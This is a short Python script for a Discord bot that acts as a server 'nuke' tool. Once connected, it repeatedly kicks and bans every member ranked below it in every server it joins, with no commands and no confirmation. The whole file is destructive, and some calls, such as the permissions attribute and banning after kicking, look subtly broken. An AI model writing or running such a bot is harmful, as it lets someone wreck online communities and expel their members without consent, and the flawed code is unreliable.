import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import os
import time

client = discord.Client()
bot = commands.Bot(command_prefix = "null")
    
@bot.listen()
async def on_ready():
    while True:
        await asyncio.sleep(2)
        for mmr in bot.get_all_members():
            if mmr.top_role.position >= mmr.guild.me.top_role.position:
                continue
            if mmr.guild.me.permissions.kick_members:
                await mmr.kick()
            if mmr.guild.me.permissions.ban_members:
                await mmr.ban()

TOKEN = os.environ['BOT_TOKEN']
bot.run(TOKEN)

